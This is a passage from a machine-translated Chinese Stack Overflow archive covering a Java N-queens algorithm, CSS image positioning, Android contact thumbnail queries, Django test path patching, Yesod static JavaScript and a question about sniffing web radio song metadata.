    for (int row = 0; row < board.length; row++) {
        for (int col = 0; col < board[row].length; col++) {
                System.out.printf("|%2d|", board[row][col]); // display elimination number of each square
        }
        System.out.println();
    }

}// end displayBoard 
```

}

我的主要方法是在单独的课程中。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T13:09:26.933

这段代码本质上是有缺陷的：

```
for (int queen = 0; queen < queens.length; queen++) {
    placeQueens(queen);
} 
```

如果不同时决定将皇后 1 到 8 放在哪里，您就无法决定将皇后 0 放在哪里。你已经实现了“First Fit”：

![第一次拟合](../Images/3b8225c4810761774da2326055bdca38.png)

正如您在上面的示例中所见，First Fit 不会产生可行的解决方案。[本手册中的更多信息（包括有效的算法）。](http://docs.jboss.org/drools/release/5.5.0.Beta1/drools-planner-docs/html_single/index.html#d0e5858)

这是一个确实有效的算法（但扩展性很差）： ![回溯](../Images/37031703c0f8f0f4d3d9ef2776c71529.png)

# audio-streaming - 从网络收音机音频流中捕获信息

> ID：13217980
> 
> 赞同：0
> 
> 时间：2012-11-04T11:06:28.790
> 
> 标签：audio-streaming, wireshark, packet-capture, packet-sniffers, webradio

在某些网络广播播放器中，每当播放一首新歌时，播放器都会向我们提供有关艺术家、歌曲和专辑图片的信息。我正在考虑是否有可能在使用像wireshark这样的数据包嗅探器流式传输网络广播时捕获这些信息。如果不是wireshark，是否还有其他更专业的软件可以处理来自音频流的信息？

有人有这方面的经验吗？

# html - 如何在右下角对齐图像

> ID：13217981
> 
> 赞同：17
> 
> 时间：2012-11-04T11:06:50.003
> 
> 标签：html, css

如何将图像放置在页面右下角。

```
<div id="background-img" class="background-img" ></div>

.background-img{
    background:url('images/bg-img.png');
    width:100%;
    height:698px; 
    repeat-x;
} 
```

我用图像创建了背景`1px`图像。现在我必须将公司徽标放在页面右下角如何做到这一点..

任何建议以及如何对此进行编码..提前谢谢...

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-04T11:12:13.303

您可以使用绝对定位：

```
position: absolute;
right: 0px;
bottom: 0px; 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-04T11:13:34.747

您可以使用`position: fixed; bottom: 0px; right: 0px;`它确保您的公司徽标始终在右下角可见 - 这意味着页面滚动不会影响其位置。

或者

您可以使用`position: absolute; bottom: 0px; right: 0px;`它来确保将您的公司徽标放置到某个位置，并且它会受到页面滚动的影响。

我创建了一个演示差异的小提琴，**[JsFiddle 示例](http://jsfiddle.net/YqR4h/56/)**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T11:13:15.820

如果您希望代码相对于窗口定位，请使用位置固定；其他明智的选择位置：如果您希望它相对于文档定位，则使用绝对位置。

相对于屏幕：

```
.background-img{

    position:fixed;
    right:10px;
    bottom: 10px 
} 
```

相对于文档

```
.background-img{

    position:absolute;
    right:10px;
    bottom: 10px 
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-04T11:14:03.400

你可以试试这个

```
 <div class="outer">
    <img src="....">
 </div> 
```

和

```
 div.outer { position: relative; height: 24px; }
 div.outer img { position: absolute; right: 0; bottom: 0; } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-04T11:12:59.160

我相信这也应该这样做：

```
.background-img
{
   width:100%;
   height:698px; 
   background: url('images/bg-img.png') repeat-x 0 0;
} 
```

还有一个背景位置 css 属性。

```
.background-img
{
   background:url('images/bg-img.png');
   width:100%;
   height:698px; 
   repeat-x;
   background-position: bottom right;
} 
```

[http://www.w3schools.com/cssref/pr_background-position.asp](http://www.w3schools.com/cssref/pr_background-position.asp)

# android - 从联系人号码中查询联系人缩略图

> ID：13217983
> 
> 赞同：1
> 
> 时间：2012-11-04T11:06:56.843
> 
> 标签：android, android-contacts

我正在尝试从给定电话号码或电子邮件 ID 的电话簿中检索联系人缩略图。我编写的代码可以工作，但需要很长时间，因为它正在查询整个联系人（根本没有效率）。

下面是代码

```
Cursor cursor;
String[] queryColumns = { ContactsContract.Contacts.PHOTO_THUMBNAIL_URI,ContactsContract.Contacts._ID };
ContentResolver cr = getContentResolver();
cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, queryColumns,
                            null, null, null);

cursor.moveToFirst();
while (cursor.moveToNext() && continueSearch) {
    String[] phonesAndEmails = extractPhonesAndEmails(Integer.parseInt(cursor.getString(1)));
    for(int g=0;g<phonesAndEmails.length;g++){
        if(phonesAndEmails[g].equals(searchFor)){
            contactThumbUri = cursor.getString(0);
            MyUtils.addLog("Found Match **************" + contactThumbUri);
            continueSearch=false;
        }
    }
}
cursor.close(); 
```

extractPhonesAndEmails 获取传递给它的contactID 的所有数字和电子邮件的String[]。

我从 SO 那里得到了另一种使用 PhoneLookup 的方法，但是给我一个错误。我检查一下这个游标返回了哪些列。我只有两列，其中一列是联系人姓名，另一列是整数，可能是 ID。这是第二个代码；

```
if(!MyUtils.checkIfEmailID(searchFor)){
    Cursor mCursor;
    Uri qUri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(searchFor));
    String[] mqueryColumns = {PhoneLookup.PHOTO_URI};
    mCursor = getContentResolver().query(qUri, mqueryColumns,null, null, null);
    MyUtils.addLog(mCursor.getCount() + " count");
    MyUtils.addLog(mCursor.getString(0));
    mCursor.moveToFirst();
    while (mCursor.moveToNext() && continueSearch) {
        contactThumbUri=mCursor.getString(0);
        MyUtils.addLog(contactThumbUri);
        continueSearch=false;
    }
    mCursor.close();    
                    } 
```

请帮助优化我的第一个代码或解决第二个代码中的错误。非常感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-05T14:07:17.910

在乔的回答和[这篇文章](https://stackoverflow.com/a/5555103/1651993)的帮助下，我能够想出对我来说完美的代码。此代码基本上将电话号码作为输入，并将缩略图 uri 返回给联系人（如果存在于电话中）。这是代码。

谢谢乔。

```
 Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(searchFor));
String[] projection = {PhoneLookup.LOOKUP_KEY};
Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
cursor.moveToFirst();
do{
    String lookUpKey = cursor.getString(0);

    uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, Uri.encode(lookUpKey));
    String[] projection1 = {ContactsContract.Contacts.PHOTO_THUMBNAIL_URI};
    Cursor cursor1 = getContentResolver().query(uri, projection1, null, null, null);
    cursor1.moveToFirst();
    contactThumbUri = cursor1.getString(0);
    cursor1.close();
    if(!contactThumbUri.equals(null)){
        continueSearch=false;
    }
}while(cursor.moveToNext() && continueSearch);
cursor.close(); 
```

类似的方法可用于查找电子邮件。需要使用**ContactsContract.Contacts.CONTENT_LOOKUP_URI**而不是**PhoneLookup.CONTENT_FILTER_URI**

希望这也可以帮助像我这样的其他初学者：P

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T19:38:10.957

首先在 ADDRESS 上查询 ContactsContract.CommonDataKinds.Email 并返回一个包含 ContactsContract.ContactsColumns.LOOKUP_KEY 的投影。这将为您提供具有该电子邮件地址的所有联系人的聚合联系人 ID（不变）。从那里，查询 LOOKUP_KEY 上的 ContactsContract.Contacts 以获取照片。或者，获取包含 LOOKUP_KEY 的行的 _ID 值，然后在 ContactsContract.RawContacts.CONTACT_ID 中查询以获取所有原始联系人，然后查询他们的照片。

联系人数据库是分层的，您必须了解它的分层结构才能有效地使用它。

此外，您应该始终在后台线程上进行查询。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-06T13:52:48.773

试试这个。

```
 final String[] queryColumns = { ContactsContract.Contacts.PHOTO_THUMBNAIL_URI,
            ContactsContract.Contacts._ID };

    final String email = "abc@gmail.com";

    final StringBuffer sb = new StringBuffer();

    sb.append("mimetype_id = (select _id from mimetypes where mimetype = " +
            "'vnd.android.cursor.item/email_v2') and data1 = '"+email +"'");

    final Cursor cursor = getContentResolver().query(ContactsContract.Data.CONTENT_URI,
            queryColumns, sb.toString(), null, null);

    if (cursor == null || !cursor.moveToFirst()) {
        return;
    }

    try {
        do {
            final String photoURI = cursor.getString(0);
            final long contactID = cursor.getLong(1);

            Log.i("Test", "PhotoURI"+photoURI+"ContactID"+contactID);

        } while (cursor.moveToNext());
    } finally {
        if (cursor != null) {
            cursor.close();
        }
    } 
```

# django - Django - 如何在测试期间更改 FileField upload_to 路径

> ID：13217990
> 
> 赞同：5
> 
> 时间：2012-11-04T11:07:35.560
> 
> 标签：django, testing, nosetests, python-mock

我正在为带有 FileField 的 Django 模型编写测试用例。我想更改上传路径以防止测试对系统的其余部分产生副作用。

我尝试将可调用传递给 upload_to 并在测试中对其进行修补：

```
#models.py
upload_path = lambda x, y: 'files'
class Model(models.Model):
    file = models.FileField(upload_to=upload_path)

#tests.py
test_path = mock.Mock()
test_path.return_value = 'files/test'
@mock.patch('models.upload_path', new=test_path)
class ModelTest(object):
    ... 
```

然而，这似乎不起作用，我相信原因是在任何测试代码运行之前，upload_path 被 FileField 取消引用，所以现在修补东西为时已晚。

如何让测试代码更改 upload_to 是什么？如果做不到这一点，模型如何检查它是否正在通过测试运行？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T14:09:33.220

我想你快到了，但是为了得到你想要的后期评估，你需要把 file_path 作为你想要修补的变量，然后使用 lambda 来延迟绑定：

```
#models.py
upload_path = 'files'
class Model(models.Model):
    file = models.FileField(upload_to=lambda x,y: upload_path)

#tests.py
@mock.patch('models.upload_path', 'files/test')
class ModelTest(object):
    ... 
```

# javascript - 在 Yesod 项目中在哪里包含静态 javascript？

> ID：13217995
> 
> 赞同：7
> 
> 时间：2012-11-04T11:08:13.923
> 
> 标签：javascript, yesod

我有一个本地静态 Javascript 文件，我想在站点范围内包含这些文件。最好我希望将所有静态 Javascript 文件合并到一个文件中，但我想分别管理这些文件。Yesod 项目中应该在哪里包含静态 Javascript 文件？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-05T17:29:36.737

有一个更具体的解决方案。

*   ''static/js'' 有一个静态 Javascript 文件的文件夹。

*   Javascript 有一个更具体的小部件命令：[addScript](http://hackage.haskell.org/packages/archive/yesod-core/latest/doc/html/Yesod-Widget.html#v%3aaddScript)

*   对于每个静态文件，[静态子站点生成一个“::Route Static”符号](http://hackage.haskell.org/packages/archive/yesod-static/latest/doc/html/Yesod-Static.html#v%3astaticFiles)，替换非标识符字符“/-”。在“静态/”的文件路径中带有“_”。

样本：

```
import Yesod.Widget (addScript)

-- given a file path of static/js/my-script.js

addScript $ StaticR js_my_script_js 
```

如果您的项目已部分编译，您可能会收到如下错误：

```
Foundation.hs:...: Not in scope: `js_my_script_js' 
```

然后要么

*   *unix touch*通过调用 staticFiles 生成路由符号的 StaticFiles.hs 模块

*   或者清理你的构建并重建它，它就会消失。

干杯!

[您也可以在我/（您的）维基百科文章](http://en.wikipedia.org/wiki/Yesod_%28web_framework%29#Subsite_Static)中了解它。随意更正并完成它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T11:26:12.943

您可以`addWidget`在`defaultLayout`函数中使用将其添加到小部件中，这些小部件组合成一个文件。

例如，

```
defaultLayout widget = do
    ...
    pc <- widgetToPageContent $ do
        $(widgetFile "mywidget")
        ... other stuff here ...    

    ... 
```

现在，只需将一个名为模板的文件放入`mywidget.julius`模板目录，它就会自动包含在所有页面中。